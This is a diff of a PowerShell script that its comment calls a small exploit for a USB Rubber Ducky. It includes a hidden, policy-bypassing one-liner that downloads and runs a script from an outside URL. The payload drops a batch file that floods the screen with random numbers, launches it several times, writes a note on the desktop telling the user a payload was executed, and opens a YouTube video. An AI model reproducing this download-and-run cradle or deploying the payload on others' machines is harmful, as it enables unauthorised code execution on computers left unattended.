@@ -1,14 +1,12 @@
 #This is a small exploit that with a usb rubber duck can be run really quickly. 
-
 # powershell -NoP -NonI -W Hidden -Exec Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('https://pxseu.cc/126bdea3bdc722e8b12087.txt'))
 
-$DesktopPath = [Environment]::GetFolderPath("Desktop")
-echo 'Hi user' > $DesktopPath/Message.txt
-echo 'Someone had acces to this pc and executed a payload.' >> $DesktopPath/Message.txt
-echo 'If you see this, please keep your pc secure.' >> $DesktopPath/Message.txt
-echo 'Thanks' >> $DesktopPath/Message.txt
+#For ($i=0; $i -le 10; $i++) {     }    //that's for me
 
-For ($i=0; $i -le 10; $i++) {
-   start https://www.youtube.com/watch?v=uR7URJZHhhY 
-}
+$DesktopPath = [Environment]::GetFolderPath("Desktop");
 
+Set-Content $DesktopPath/Hax.bat '@echo off','title H4cking',':a','echo %random%%random%%random%%random%%random%%random%%random%%random%%random%','goto :a'   -Encoding ASCII;
+Set-Content $DesktopPath/Message.txt 'Hi user', 'Someone had acces to this pc and executed a payload.', 'If you see this, please keep your pc secure.' , 'Thanks' -Encoding ASCII;
+
+start https://www.youtube.com/watch?v=uR7URJZHhhY;
+For ($i=0; $i -le 4; $i++) { start $DesktopPath/Hax.bat; }
